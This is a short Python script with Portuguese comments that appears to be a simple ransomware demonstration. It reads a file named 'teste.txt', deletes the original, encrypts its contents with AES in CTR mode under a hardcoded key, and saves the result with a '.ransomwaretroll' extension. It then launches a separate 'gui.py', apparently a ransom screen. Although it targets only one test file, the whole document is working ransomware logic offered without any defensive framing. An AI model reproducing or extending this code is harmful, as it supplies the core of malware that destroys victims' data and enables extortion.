import os
import pyaes

# abre o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

# remove o arquivo
os.remove(file_name)

# chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# criptografa o arquivo
crypto_data = aes.encrypt(file_data)

# salva o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()

os.system("python gui.py")
